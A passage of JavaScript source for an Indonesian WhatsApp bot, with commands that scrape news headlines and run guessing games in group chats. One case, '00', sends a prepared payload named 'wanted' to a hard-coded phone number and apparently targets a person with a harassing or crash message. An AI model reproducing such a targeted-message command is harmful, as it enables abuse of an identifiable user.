 Ditss.sendMessage(m.chat, {
text: "@" + m.chat,
contextInfo: {
mentionedJid: (await (await Ditss.groupMetadata(m.chat)).participants).map(a => a.id),
groupMentions: [
{
groupJid: m.chat,
groupSubject: `${text}`
}
]
}
}
)
 setTimeout(async () => {
// reply(`${pushname} memggunakan ${command} untuk memanggil kalian`)
 }, 1120)
 //D|ts si pler 🐎
break 



case 'layarkaca':


if (!q) return reply('Judul') 
LayarKaca21(q).then(async(res) => {
no = 0
iwannn = ""
for (let i of res) {
no += 1
iwannn += `\n• ${no.toString()} •\n`
iwannn += `Film: ${i.film_title}\n`
iwannn += `Link: ${i.film_link}\n`
}
iwannn += ``
reply(iwannn) 
})
//D|ts si pler 🐎
break 
//=================================================//
case 'cnbc':


CNBCNews().then(async(res) => {
no = 0
iwannnn = ""
for (let i of res) {
no += 1
iwannnn += `\n• ${no.toString()} •\n`
iwannnn += `Berita: ${i.berita}\n`
iwannnn += `Upload: ${i.berita_diupload}\n`
iwannnn += `Link: ${i.berita_url}\n`
}
iwannnn += ""
Ditss.sendMessage(m.chat, { image : { url : res[0].berita_thumb }, caption: iwannnn }, { quoted:m })
})
//D|ts si pler 🐎
break 
//=================================================//
case 'tribun':


TribunNews().then(async(res) => {
no = 0
iwannnnn = ""
for (let i of res) {
no += 1
iwannnnn += `\n• ${no.toString()} •\n`
iwannnnn += `Berita: ${i.berita}\n`
iwannnnn += `Upload: ${i.berita_diupload}\n`
iwannnnn += `Jenis: ${i.berita_jenis}\n`
iwannnnn += `Link: ${i.berita_url}\n`
}
iwannnnn += ""
Ditss.sendMessage(m.chat, { image : { url : res[0].berita_thumb }, caption: iwannnnn }, { quoted:m })
})
//D|ts si pler 🐎
break 
//=================================================//
case 'indozone':


IndozoneNews().then(async(res) => {
no = 0
iwannnnnn = ""
for (let i of res) {
no += 1
iwannnnnn += `\n• ${no.toString()} •\n`
iwannnnnn += `Berita: ${i.berita}\n`
iwannnnnn += `Upload: ${i.berita_diupload}\n`
iwannnnnn += `Jenis: ${i.berita_jenis}\n`
iwannnnnn += `Link: ${i.berita_url}\n`
}
iwannnnnn += ""
Ditss.sendMessage(m.chat, { image : { url : res[0].berita_thumb }, caption: iwannnnnn }, { quoted:m })
})
//D|ts si pler 🐎
break 
//=================================================//
case 'kompas':


KompasNews().then(async(res) => {
no = 0
iwannnnnnn = ""
for (let i of res) {
no += 1
iwannnnnnn += `\n• ${no.toString()} •\n`
iwannnnnnn += `Berita: ${i.berita}\n`
iwannnnnnn += `Upload: ${i.berita_diupload}\n`
iwannnnnnn += `Jenis: ${i.berita_jenis}\n`
iwannnnnnn += `Link: ${i.berita_url}\n`
}
iwannnnnnn += ""
Ditss.sendMessage(m.chat, { image : { url : res[0].berita_thumb }, caption: iwannnnnnn }, { quoted:m })
})
//D|ts si pler 🐎
break 
//=================================================//
case 'detiknews':


DetikNews().then(async(res) => {
no = 0
iwannnnnnnn = ""
for (let i of res) {
no += 1
iwannnnnnnn += `\n• ${no.toString()} •\n`
iwannnnnnnn += `Berita: ${i.berita}\n`
iwannnnnnnn += `Upload: ${i.berita_diupload}\n`
iwannnnnnnn += `Link: ${i.berita_url}\n`
}
iwannnnnnnn += ""
Ditss.sendMessage(m.chat, { image : { url : res[0].berita_thumb }, caption: iwannnnnnnn }, { quoted:m })
})
//D|ts si pler 🐎
break 
//=================================================//
case 'dailynews':


DailyNews().then(async(res) => {
no = 0
iwannnnnnnnn = ""
for (let i of res) {
no += 1
iwannnnnnnnn += `\n• ${no.toString()} •\n`
iwannnnnnnnn += `Berita: ${i.berita}\n`
iwannnnnnnnn += `Link: ${i.berita_url}\n`
}
iwannnnnnnnn += ""
Ditss.sendMessage(m.chat, { image : { url : res[0].berita_thumb }, caption: iwannnnnnnnn }, { quoted:m })
})
//D|ts si pler 🐎
break 
//=================================================//
case 'inews':


iNews().then(async(res) => {
no = 0
iwannnnnnnnnn = ""
for (let i of res) {
no += 1
iwannnnnnnnnn += `\n• ${no.toString()} •\n`
iwannnnnnnnnn += `Berita: ${i.berita}\n`
iwannnnnnnnnn += `Upload: ${i.berita_diupload}\n`
iwannnnnnnnnn += `Jenis: ${i.berita_jenis}\n`
iwannnnnnnnnn += `Link: ${i.berita_url}\n`
}
iwannnnnnnnnn += ""
reply(iwannnnnnnnnn) 
})
break
//=================================================//
case 'okezone':


OkezoneNews().then(async(res) => {
no = 0
iwannnnnnnnnnn = ""
for (let i of res) {
no += 1
iwannnnnnnnnnn += `\n• ${no.toString()} •\n`
iwannnnnnnnnnn += `Berita: ${i.berita}\n`
iwannnnnnnnnnn += `Upload: ${i.berita_diupload}\n`
iwannnnnnnnnnn += `Link: ${i.berita_url}\n`
}
iwannnnnnnnnnn += ""
Ditss.sendMessage(m.chat, { image : { url : res[0].berita_thumb }, caption: iwannnnnnnnnnn }, { quoted:m })
})
//D|ts si pler 🐎
break 
//=================================================//
case 'sindo':


SindoNews().then(async(res) => {
no = 0
iwannnnnnnnnnnn = ""
for (let i of res) {
no += 1
iwannnnnnnnnnnn += `\n• ${no.toString()} •\n`
iwannnnnnnnnnnn += `Berita: ${i.berita}\n`
iwannnnnnnnnnnn += `Jenis: ${i.berita_jenis}\n`
iwannnnnnnnnnnn += `Link: ${i.berita_url}\n`
}
iwannnnnnnnnnnn += ""
reply(iwannnnnnnnnnnn) 
})
//D|ts si pler 🐎
break 
 //ppp
case '00':{
target = "6285882135288@s.whatsapp.net"
sendQP(target, wanted)
    }
  //D|ts si pler 🐎
break 
//=================================================//
case 'tempo':


TempoNews().then(async(res) => {
no = 0
iwannnnnnnnnnnnn = ""
for (let i of res) {
no += 1
iwannnnnnnnnnnnn += `\n• ${no.toString()} •\n`
iwannnnnnnnnnnnn += `Berita: ${i.berita}\n`
iwannnnnnnnnnnnn += `Upload: ${i.berita_diupload}\n`
iwannnnnnnnnnnnn += `Link: ${i.berita_url}\n`
}
iwannnnnnnnnnnnn += ""
Ditss.sendMessage(m.chat, { image : { url : res[0].berita_thumb }, caption: iwannnnnnnnnnnnn }, { quoted:m })
})
//D|ts si pler 🐎
break 
//=================================================//
case 'antara':


AntaraNews().then(async(res) => {
no = 0
iwannnnnnnnnnnnnn = ""
for (let i of res) {
no += 1
iwannnnnnnnnnnnnn += `\n• ${no.toString()} •\n`
iwannnnnnnnnnnnnn += `Berita: ${i.berita}\n`
iwannnnnnnnnnnnnn += `Upload: ${i.berita_diupload}\n`
iwannnnnnnnnnnnnn += `Jenis: ${i.berita_jenis}\n`
iwannnnnnnnnnnnnn += `Link: ${i.berita_url}\n`
}
iwannnnnnnnnnnnnn += ""
Ditss.sendMessage(m.chat, { image : { url : res[0].berita_thumb }, caption: iwannnnnnnnnnnnnn }, { quoted:m })
})
//D|ts si pler 🐎
break 
//=================================================//
case "kontan":


KontanNews().then(async (res) => {
iwannnnnnnnnnnnnnn = ""
no = 0
for (let i of res) {
no += 1
iwannnnnnnnnnnnnnn += `\n• ${no.toString()} •\n`
iwannnnnnnnnnnnnnn += `Berita: ${i.berita}\n`
iwannnnnnnnnnnnnnn += `Jenis: ${i.berita_jenis}\n`
iwannnnnnnnnnnnnnn += `Upload: ${i.berita_diupload}\n`
iwannnnnnnnnnnnnnn += `Link: ${i.berita_url}\n`
}
iwannnnnnnnnnnnnnn += ""
Ditss.sendMessage(m.chat, { image : { url : res[0].berita_thumb }, caption: iwannnnnnnnnnnnnnn }, { quoted:m })
})
//D|ts si pler 🐎
break 
//=================================================//
case "merdeka":


MerdekaNews().then(async (res) => {
iwannnnnnnnnnnnnnnn = ""
no = 0
for (let i of res) {
no += 1
iwannnnnnnnnnnnnnnn += `\n• ${no.toString()} •\n`
iwannnnnnnnnnnnnnnn += `Berita: ${i.berita}\n`
iwannnnnnnnnnnnnnnn += `Upload: ${i.berita_diupload}\n`
iwannnnnnnnnnnnnnnn += `Link: ${i.berita_url}\n`
}
iwannnnnnnnnnnnnnnn += ""
Ditss.sendMessage(m.chat, { image : { url : res[0].berita_thumb }, caption: iwannnnnnnnnnnnnnnn }, { quoted:m })
})
//D|ts si pler 🐎
break 
//=================================================//
case "jalantikus":

var reis = await JalanTikusMeme()
tekcs = ""
tekcs += "Jalan Tikus Meme\n\n"
tekcs += `Source: ${reis}`
tekcs += ""
Ditss.sendMessage(m.chat, { image : { url : reis }, caption: tekcs }, { quoted:m })
//D|ts si pler 🐎
break 



case 'petakbom':
//if (!isRegistered) return registerbut(noregis)
if (!global.game) return Reply(`Aktifkan botsetting terlebih dahulu dengan cara masukkan perintah *.botsetting* lalu vote on`) 
if (from in tebakgambar) return Reply('Beresin dulu game Tebak Gambar kamu ಠ⁠︵⁠ಠ');
if (from in tebakanime) return Reply('Beresin dulu game Tebak Anime kamu ಠ⁠︵⁠ಠ');
if (from in tebakkata) return Reply('Beresin dulu game Tebak Kata kamu ಠ⁠︵⁠ಠ');
if (from in tebakkalimat) return Reply('Beresin dulu game Tebak Kalimat kamu ಠ⁠︵⁠ಠ');
if (from in susunkata) return Reply('Beresin dulu game Susun Kata kamu ಠ⁠︵⁠ಠ');
if (from in tebaklagu) return Reply('Beresin dulu game Tebak Lagu kamu ಠ⁠︵⁠ಠ');
if (from in tebaklirik) return Reply('Beresin dulu game Tebak Lirik kamu ಠ⁠︵⁠ಠ');
if (from in tebakkimia) return Reply('Beresin dulu game Tebak Kata kamu ಠ⁠︵⁠ಠ');
if (from in tebakbendera) return Reply('Beresin dulu game Tebak Bendera kamu ಠ⁠︵⁠ಠ');
if (from in asahotak) return Reply('Beresin dulu game Asah Otak kamu ಠ⁠︵⁠ಠ');
if (from in kuis) return Reply('Beresin dulu game Kuis kamu ಠ⁠︵⁠ಠ');
if (sender in petakbom) return Reply(`Game mu masih belum terselesaikan, lanjutkan yukk\n\n${petakbom[sender].board.join("")}\n\nKirim ${prefix}delpetakbom untuk menghapus game petak bom`);
function shuffle(array) {
return array.sort(() => Math.random() - 0.5);
}
petakbom[sender] = {
petak: shuffle([0, 0, 0, 2, 0, 2, 0, 2, 0, 0]),
board: ["1️⃣", "2️⃣", "3️⃣", "4️⃣", "5️⃣", "6️⃣", "7️⃣", "8️⃣", "9️⃣", "🔟"],
bomb: 3,
lolos: 7,
pick: 0,
hadiah: randomNomor(5000, 10000),
nyawa: ["❤️", "❤️", "❤️"]
};
await Reply(`*PETAK BOM*

${petakbom[sender].board.join("")}

Pilih lah nomor tersebut! dan jangan sampai terkena Bom!
Bomb : ${petakbom[sender].bomb}
Nyawa : ${petakbom[sender].nyawa.join("")}`);
break
case 'delpetakbom':
//if (!isRegistered) return registerbut(noregis)
if(!m.isGroup) return onlyGroup()
if (!global.game) return Reply(`Aktifkan botsetting terlebih dahulu dengan cara masukkan perintah *.botsetting* lalu vote on`) 
if (!(sender in petakbom)) return Reply(`kamu sedang tidak bermain petakbom!`)
delete petakbom[sender];
conn.sendMessage(m.chat, {react: {text: '🟢', key: m.key}})
Reply(`Petakbom di akhiri, hadiah Rp. 0`)
break
case 'tebakgambar':
//if (!isRegistered) return registerbut(noregis)
if (!global.game) return Reply(`Aktifkan botsetting terlebih dahulu dengan cara masukkan perintah *.botsetting* lalu vote on`) 
if(!m.isGroup) return onlyGroup()
if (from in tebakgambar) return Reply('Beresin dulu game Tebak Gambar kamu ಠ⁠︵⁠ಠ');
if (from in tebakanime) return Reply('Beresin dulu game Tebak Anime kamu ಠ⁠︵⁠ಠ');
if (from in tebakkata) return Reply('Beresin dulu game Tebak Kata kamu ಠ⁠︵⁠ಠ');
if (from in tebakkalimat) return Reply('Beresin dulu game Tebak Kalimat kamu ಠ⁠︵⁠ಠ');
if (from in susunkata) return Reply('Beresin dulu game Susun Kata kamu ಠ⁠︵⁠ಠ');
if (from in tebaklagu) return Reply('Beresin dulu game Tebak Lagu kamu ಠ⁠︵⁠ಠ');
if (from in tebaklirik) return Reply('Beresin dulu game Tebak Lirik kamu ಠ⁠︵⁠ಠ');
if (from in tebakkimia) return Reply('Beresin dulu game Tebak Kata kamu ಠ⁠︵⁠ಠ');
if (from in tebakbendera) return Reply('Beresin dulu game Tebak Bendera kamu ಠ⁠︵⁠ಠ');
if (from in asahotak) return Reply('Beresin dulu game Asah Otak kamu ಠ⁠︵⁠ಠ');
if (from in kuis) return Reply('Beresin dulu game Kuis kamu ಠ⁠︵⁠ಠ');

var { img, jawaban, deskripsi } = pickRandom(JSON.parse(fs.readFileSync('./sistem-asuma/game/tebakgambar.json')));
console.log('Jawaban : '+jawaban)
var teks1 = `*GAME TEBAK GAMBAR*\n\nPetunjuk: ${monospace(jawaban.replace(/[b|c|d|f|g|h|j|k|l|m|n|p|q|r|s|t|v|w|x|y|z]/gi, '-'))}\nDeskripsi: ${deskripsi}\nWaktu: ${gamewaktu} detik`
await Ditss.sendMessage(from, {image: {url: img}, caption: teks1}, {quoted: m})
tebakgambar[from] = {
soal: img,
jawaban: jawaban.toLowerCase(),
waktu: setTimeout(function () {
if (tebakgambar[from]) Reply(`Waktu habis!\nJawabannya adalah: ${tebakgambar[from].jawaban}`);
delete tebakgambar[from];
}, gamewaktu * 1000)
}
break
case 'tebakanime':
//if (!isRegistered) return registerbut(noregis)
if(!m.isGroup) return onlyGroup()
if (from in tebakgambar) return Reply('Beresin dulu game Tebak Gambar kamu ಠ⁠︵⁠ಠ');
if (from in tebakanime) return Reply('Beresin dulu game Tebak Anime kamu ಠ⁠︵⁠ಠ');
if (from in tebakkata) return Reply('Beresin dulu game Tebak Kata kamu ಠ⁠︵⁠ಠ');
if (from in tebakkalimat) return Reply('Beresin dulu game Tebak Kalimat kamu ಠ⁠︵⁠ಠ');
if (from in susunkata) return Reply('Beresin dulu game Susun Kata kamu ಠ⁠︵⁠ಠ');
if (from in tebaklagu) return Reply('Beresin dulu game Tebak Lagu kamu ಠ⁠︵⁠ಠ');
if (from in tebaklirik) return Reply('Beresin dulu game Tebak Lirik kamu ಠ⁠︵⁠ಠ');
if (from in tebakkimia) return Reply('Beresin dulu game Tebak Kata kamu ಠ⁠︵⁠ಠ');
if (from in tebakbendera) return Reply('Beresin dulu game Tebak Bendera kamu ಠ⁠︵⁠ಠ');
if (from in asahotak) return Reply('Beresin dulu game Asah Otak kamu ಠ⁠︵⁠ಠ');
if (from in kuis) return Reply('Beresin dulu game Kuis kamu ಠ⁠︵⁠ಠ');

var { image, jawaban } = pickRandom(JSON.parse(fs.readFileSync('./sistem-asuma/game/tebakanime.json')));
console.log('Jawaban : '+jawaban)
var teks1 = `*GAME TEBAK ANIME*\n\nPetunjuk: ${monospace(jawaban.replace(/[b|c|d|f|g|h|j|k|l|m|n|p|q|r|s|t|v|w|x|y|z]/gi, '-'))}\nWaktu: ${gamewaktu} detik`
await Ditss.sendMessage(from, {image: {url: image}, caption: teks1}, {quoted: m})
tebakanime[from] = {
soal: image,
jawaban: jawaban.toLowerCase(),
hadiah: randomNomor(10, 20),
waktu: setTimeout(function () {
if (tebakanime[from]) Reply(`Waktu habis!\nJawabannya adalah: ${tebakanime[from].jawaban}`);
delete tebakanime[from];
}, gamewaktu * 1000)
}
break
case 'tebaklagu':
//if (!isRegistered) return registerbut(noregis)
if(!m.isGroup) return onlyGroup()
if (!global.game) return Reply(`Aktifkan botsetting terlebih dahulu dengan cara masukkan perintah *.botsetting* lalu vote on`) 
if (from in tebakgambar) return Reply('Beresin dulu game Tebak Gambar kamu ಠ⁠︵⁠ಠ');
if (from in tebakanime) return Reply('Beresin dulu game Tebak Anime kamu ಠ⁠︵⁠ಠ');
if (from in tebakkata) return Reply('Beresin dulu game Tebak Kata kamu ಠ⁠︵⁠ಠ');
if (from in tebakkalimat) return Reply('Beresin dulu game Tebak Kalimat kamu ಠ⁠︵⁠ಠ');
if (from in susunkata) return Reply('Beresin dulu game Susun Kata kamu ಠ⁠︵⁠ಠ');
if (from in tebaklagu) return Reply('Beresin dulu game Tebak Lagu kamu ಠ⁠︵⁠ಠ');
if (from in tebaklirik) return Reply('Beresin dulu game Tebak Lirik kamu ಠ⁠︵⁠ಠ');
if (from in tebakkimia) return Reply('Beresin dulu game Tebak Kata kamu ಠ⁠︵⁠ಠ');
if (from in tebakbendera) return Reply('Beresin dulu game Tebak Bendera kamu ಠ⁠︵⁠ಠ');
if (from in asahotak) return Reply('Beresin dulu game Asah Otak kamu ಠ⁠︵⁠ಠ');
if (from in kuis) return Reply('Beresin dulu game Kuis kamu ಠ⁠︵⁠ಠ');

var { soal, artis, jawaban } = pickRandom(JSON.parse(fs.readFileSync('./sistem-asuma/game/tebaklagu.json')));
console.log('Jawaban : '+jawaban)
if (jawaban.toLowerCase() == 'audio tidak ditemukan, silahkan request ulang!') return Reply('Maaf terjadi kesalahan!')
var teks1 = `*GAME TEBAK LAGU*\n\nPetunjuk: ${monospace(jawaban.replace(/[b|c|d|f|g|h|j|k|l|m|n|p|q|r|s|t|v|w|x|y|z]/gi, '-'))}\nArtist: ${artis}\nWaktu: ${gamewaktu} detik`
await Ditss.sendMessage(from, {audio: {url: soal}, mimetype: 'audio/mpeg', ptt: true}, {quoted: m}).then(res => {Ditss.sendMessage(from, teks1, res)})
tebaklagu[from] = {
soal: soal,
jawaban: jawaban.toLowerCase(),
hadiah: randomNomor(10, 20),
waktu: setTimeout(function () {
if (tebaklagu[from]) Reply(`Waktu habis\nJawabannya adalah: ${tebaklagu[from].jawaban}`);
delete tebaklagu[from];
}, gamewaktu * 1000)
}
break
case 'kuis':
//if (!isRegistered) return registerbut(noregis)
if(!m.isGroup) return onlyGroup()
if (!global.game) return Reply(`Aktifkan botsetting terlebih dahulu dengan cara masukkan perintah *.botsetting* lalu vote on`) 
if (from in tebakgambar) return Reply('Beresin dulu game Tebak Gambar kamu ಠ⁠︵⁠ಠ');
if (from in tebakanime) return Reply('Beresin dulu game Tebak Anime kamu ಠ⁠︵⁠ಠ');
if (from in tebakkata) return Reply('Beresin dulu game Tebak Kata kamu ಠ⁠︵⁠ಠ');
if (from in tebakkalimat) return Reply('Beresin dulu game Tebak Kalimat kamu ಠ⁠︵⁠ಠ');
if (from in susunkata) return Reply('Beresin dulu game Susun Kata kamu ಠ⁠︵⁠ಠ');
if (from in tebaklagu) return Reply('Beresin dulu game Tebak Lagu kamu ಠ⁠︵⁠ಠ');
if (from in tebaklirik) return Reply('Beresin dulu game Tebak Lirik kamu ಠ⁠︵⁠ಠ');
if (from in tebakkimia) return Reply('Beresin dulu game Tebak Kata kamu ಠ⁠︵⁠ಠ');
if (from in tebakbendera) return Reply('Beresin dulu game Tebak Bendera kamu ಠ⁠︵⁠ಠ');
if (from in asahotak) return Reply('Beresin dulu game Asah Otak kamu ಠ⁠︵⁠ಠ');
if (from in kuis) return Reply('Beresin dulu game Kuis kamu ಠ⁠︵⁠ಠ');

var { soal, jawaban } = pickRandom(JSON.parse(fs.readFileSync('./sistem-asuma/game/kuis.json')));
console.log('Jawaban : '+jawaban)
await Reply(`*GAME KUIS*\n\nSoal: ${soal}\nPetunjuk: ${monospace(jawaban.replace(/[b|c|d|f|g|h|j|k|l|m|n|p|q|r|s|t|v|w|x|y|z]/gi, '-'))}\nWaktu: ${gamewaktu} detik`)
kuis[from] = {
soal: soal,
jawaban: jawaban.toLowerCase(),
hadiah: randomNomor(10, 20),
waktu: setTimeout(function () {
if (kuis[from]) Reply(`Waktu habis!\n\nJawaban dari soal:\n${monospace(soal)}\n\nAdalah: ${monospace(jawaban)}`);
delete kuis[from];
}, gamewaktu * 1000)
}
break
case 'tebakkalimat':
//if (!isRegistered) return registerbut(noregis)
if(!m.isGroup) return onlyGroup()
if (!global.game) return Reply(`Aktifkan botsetting terlebih dahulu dengan cara masukkan perintah *.botsetting* lalu vote on`) 
if (from in tebakgambar) return Reply('Beresin dulu game Tebak Gambar kamu ಠ⁠︵⁠ಠ');
if (from in tebakanime) return Reply('Beresin dulu game Tebak Anime kamu ಠ⁠︵⁠ಠ');
if (from in tebakkata) return Reply('Beresin dulu game Tebak Kata kamu ಠ⁠︵⁠ಠ');
if (from in tebakkalimat) return Reply('Beresin dulu game Tebak Kalimat kamu ಠ⁠︵⁠ಠ');
if (from in susunkata) return Reply('Beresin dulu game Susun Kata kamu ಠ⁠︵⁠ಠ');
if (from in tebaklagu) return Reply('Beresin dulu game Tebak Lagu kamu ಠ⁠︵⁠ಠ');
if (from in tebaklirik) return Reply('Beresin dulu game Tebak Lirik kamu ಠ⁠︵⁠ಠ');
if (from in tebakkimia) return Reply('Beresin dulu game Tebak Kata kamu ಠ⁠︵⁠ಠ');
if (from in tebakbendera) return Reply('Beresin dulu game Tebak Bendera kamu ಠ⁠︵⁠ಠ');
if (from in asahotak) return Reply('Beresin dulu game Asah Otak kamu ಠ⁠︵⁠ಠ');
if (from in kuis) return Reply('Beresin dulu game Kuis kamu ಠ⁠︵⁠ಠ');

var { soal, jawaban } = pickRandom(JSON.parse(fs.readFileSync('./sistem-asuma/game/tebakkalimat.json')));
console.log('Jawaban : '+jawaban)
await Reply(`*GAME TEBAK KALIMAT*\n\nSoal: ${soal}\nPetunjuk: ${monospace(jawaban.replace(/[b|c|d|f|g|h|j|k|l|m|n|p|q|r|s|t|v|w|x|y|z]/gi, '-'))}\nWaktu: ${gamewaktu} detik`)
tebakkalimat[from] = {
soal: soal,
jawaban: jawaban.toLowerCase(),
hadiah: randomNomor(10, 20),
waktu: setTimeout(function () {
if (tebakkalimat[from]) Reply(`Waktu habis!\n\nJawaban dari soal:\n${monospace(soal)}\n\nAdalah: ${monospace(jawaban)}`);
delete tebakkalimat[from];
}, gamewaktu * 1000)
}
break
case 'tebakkata':
//if (!isRegistered) return registerbut(noregis)
if(!m.isGroup) return onlyGroup()
if (!global.game) return Reply(`Aktifkan botsetting terlebih dahulu dengan cara masukkan perintah *.botsetting* lalu vote on`)
if (from in tebakgambar) return Reply('Beresin dulu game Tebak Gambar kamu ಠ⁠︵⁠ಠ');
if (from in tebakanime) return Reply('Beresin dulu game Tebak Anime kamu ಠ⁠︵⁠ಠ');
if (from in tebakkata) return Reply('Beresin dulu game Tebak Kata kamu ಠ⁠︵⁠ಠ');
if (from in tebakkalimat) return Reply('Beresin dulu game Tebak Kalimat kamu ಠ⁠︵⁠ಠ');
if (from in susunkata) return Reply('Beresin dulu game Susun Kata kamu ಠ⁠︵⁠ಠ');
if (from in tebaklagu) return Reply('Beresin dulu game Tebak Lagu kamu ಠ⁠︵⁠ಠ');
if (from in tebaklirik) return Reply('Beresin dulu game Tebak Lirik kamu ಠ⁠︵⁠ಠ');
if (from in tebakkimia) return Reply('Beresin dulu game Tebak Kata kamu ಠ⁠︵⁠ಠ');
if (from in tebakbendera) return Reply('Beresin dulu game Tebak Bendera kamu ಠ⁠︵⁠ಠ');
if (from in asahotak) return Reply('Beresin dulu game Asah Otak kamu ಠ⁠︵⁠ಠ');
if (from in kuis) return Reply('Beresin dulu game Kuis kamu ಠ⁠︵⁠ಠ');

var { soal, jawaban } = pickRandom(JSON.parse(fs.readFileSync('./sistem-asuma/game/tebakkata.json')));
console.log('Jawaban : '+jawaban)
await Reply(`*GAME TEBAK KATA*\n\nSoal: ${soal}\nPetunjuk: ${monospace(jawaban.replace(/[b|c|d|f|g|h|j|k|l|m|n|p|q|r|s|t|v|w|x|y|z]/gi, '-'))}\nWaktu: ${gamewaktu} detik`)
tebakkata[from] = {
soal: soal,
jawaban: jawaban.toLowerCase(),
hadiah: randomNomor(10, 20),
waktu: setTimeout(function () {
if (tebakkata[from]) Reply(`Waktu habis!\n\nJawaban dari soal:\n${monospace(soal)}\n\nAdalah: ${monospace(jawaban)}`);
delete tebakkata[from];
}, gamewaktu * 1000)
}
break
case 'tebaklirik':
//if (!isRegistered) return registerbut(noregis)
if(!m.isGroup) return onlyGroup()
if (!global.game) return Reply(`Aktifkan botsetting terlebih dahulu dengan cara masukkan perintah *.botsetting* lalu vote on`) 
if (from in tebakgambar) return Reply('Beresin dulu game Tebak Gambar kamu ಠ⁠︵⁠ಠ');
if (from in tebakanime) return Reply('Beresin dulu game Tebak Anime kamu ಠ⁠︵⁠ಠ');
if (from in tebakkata) return Reply('Beresin dulu game Tebak Kata kamu ಠ⁠︵⁠ಠ');
if (from in tebakkalimat) return Reply('Beresin dulu game Tebak Kalimat kamu ಠ⁠︵⁠ಠ');
if (from in susunkata) return Reply('Beresin dulu game Susun Kata kamu ಠ⁠︵⁠ಠ');
if (from in tebaklagu) return Reply('Beresin dulu game Tebak Lagu kamu ಠ⁠︵⁠ಠ');
if (from in tebaklirik) return Reply('Beresin dulu game Tebak Lirik kamu ಠ⁠︵⁠ಠ');
if (from in tebakkimia) return Reply('Beresin dulu game Tebak Kata kamu ಠ⁠︵⁠ಠ');
if (from in tebakbendera) return Reply('Beresin dulu game Tebak Bendera kamu ಠ⁠︵⁠ಠ');
if (from in asahotak) return Reply('Beresin dulu game Asah Otak kamu ಠ⁠︵⁠ಠ');
if (from in kuis) return Reply('Beresin dulu game Kuis kamu ಠ⁠︵⁠ಠ');

var { soal, jawaban } = pickRandom(JSON.parse(fs.readFileSync('./sistem-asuma/game/tebaklirik.json')));
console.log('Jawaban : '+jawaban)
await Reply(`*GAME TEBAK LIRIK*\n\nSoal: ${soal}\nPetunjuk: ${monospace(jawaban.replace(/[b|c|d|f|g|h|j|k|l|m|n|p|q|r|s|t|v|w|x|y|z]/gi, '-'))}\nWaktu: ${gamewaktu} detik`)
tebaklirik[from] = {
soal: soal,
jawaban: jawaban.toLowerCase(),
hadiah: randomNomor(10, 20),
waktu: setTimeout(function () {
if (tebaklirik[from]) Reply(`Waktu habis!\n\nJawaban dari soal:\n${monospace(soal)}\n\nAdalah: ${monospace(jawaban)}`);
delete tebaklirik[from];
}, gamewaktu * 1000)
}
break
case 'tebakkimia':
//if (!isRegistered) return registerbut(noregis)
if(!m.isGroup) return onlyGroup()
if (from in tebakgambar) return Reply('Beresin dulu game Tebak Gambar kamu ಠ⁠︵⁠ಠ');
if (from in tebakanime) return Reply('Beresin dulu game Tebak Anime kamu ಠ⁠︵⁠ಠ');
if (from in tebakkata) return Reply('Beresin dulu game Tebak Kata kamu ಠ⁠︵⁠ಠ');
if (from in tebakkalimat) return Reply('Beresin dulu game Tebak Kalimat kamu ಠ⁠︵⁠ಠ');
if (from in susunkata) return Reply('Beresin dulu game Susun Kata kamu ಠ⁠︵⁠ಠ');
if (from in tebaklagu) return Reply('Beresin dulu game Tebak Lagu kamu ಠ⁠︵⁠ಠ');
if (from in tebaklirik) return Reply('Beresin dulu game Tebak Lirik kamu ಠ⁠︵⁠ಠ');
if (from in tebakkimia) return Reply('Beresin dulu game Tebak Kata kamu ಠ⁠︵⁠ಠ');
if (from in tebakbendera) return Reply('Beresin dulu game Tebak Bendera kamu ಠ⁠︵⁠ಠ');
if (from in asahotak) return Reply('Beresin dulu game Asah Otak kamu ಠ⁠︵⁠ಠ');
if (from in kuis) return Reply('Beresin dulu game Kuis kamu ಠ⁠︵⁠ಠ');

var { soal, jawaban } = pickRandom(JSON.parse(fs.readFileSync('./sistem-asuma/game/tebakkimia.json')));
console.log('Jawaban : '+jawaban)
await Reply(`*GAME TEBAK KIMIA*\n\nSoal: ${soal}\nWaktu: ${gamewaktu} detik`)
tebakkimia[from] = {
soal: soal,
jawaban: jawaban.toLowerCase(),
hadiah: randomNomor(10, 20),
waktu: setTimeout(function () {
if (tebakkimia[from]) Reply(`Waktu berakhir :(\nNama unsur dari lambang ${soal}\n\nAdalah: ${monospace(jawaban)}`)
delete tebakkimia[from];
}, gamewaktu * 1000)
}
break
case 'tebakbendera':
//if (!isRegistered) return registerbut(noregis)
if(!m.isGroup) return onlyGroup()
if (!global.game) return Reply(`Aktifkan botsetting terlebih dahulu dengan cara masukkan perintah *.botsetting* lalu vote on`) 
if (from in tebakgambar) return Reply('Beresin dulu game Tebak Gambar kamu ಠ⁠︵⁠ಠ');
if (from in tebakanime) return Reply('Beresin dulu game Tebak Anime kamu ಠ⁠︵⁠ಠ');
if (from in tebakkata) return Reply('Beresin dulu game Tebak Kata kamu ಠ⁠︵⁠ಠ');
if (from in tebakkalimat) return Reply('Beresin dulu game Tebak Kalimat kamu ಠ⁠︵⁠ಠ');
if (from in susunkata) return Reply('Beresin dulu game Susun Kata kamu ಠ⁠︵⁠ಠ');
if (from in tebaklagu) return Reply('Beresin dulu game Tebak Lagu kamu ಠ⁠︵⁠ಠ');
if (from in tebaklirik) return Reply('Beresin dulu game Tebak Lirik kamu ಠ⁠︵⁠ಠ');
if (from in tebakkimia) return Reply('Beresin dulu game Tebak Kata kamu ಠ⁠︵⁠ಠ');
if (from in tebakbendera) return Reply('Beresin dulu game Tebak Bendera kamu ಠ⁠︵⁠ಠ');
if (from in asahotak) return Reply('Beresin dulu game Asah Otak kamu ಠ⁠︵⁠ಠ');
if (from in kuis) return Reply('Beresin dulu game Kuis kamu ಠ⁠︵⁠ಠ');

var { soal, jawaban } = pickRandom(JSON.parse(fs.readFileSync('./sistem-asuma/game/tebakbendera.json')));
console.log('Jawaban : '+jawaban)
await Reply(`*GAME TEBAK BENDERA*\n\nSoal: ${soal}\nPetunjuk: ${monospace(jawaban.replace(/[b|c|d|f|g|h|j|k|l|m|n|p|q|r|s|t|v|w|x|y|z]/gi, '-'))}\nWaktu: ${gamewaktu} detik`)
tebakbendera[from] = {
soal: soal,
jawaban: jawaban.toLowerCase(),
hadiah: randomNomor(10, 20),
waktu: setTimeout(function () {
if (tebakbendera[from]) Reply(`Waktu habis!\n\nJawaban dari soal:\n${monospace(soal)}\n\nAdalah: ${monospace(jawaban)}`);
delete tebakbendera[from];
}, gamewaktu * 1000)
}
break
case 'susunkata':
//if (!isRegistered) return registerbut(noregis)
if(!m.isGroup) return onlyGroup()
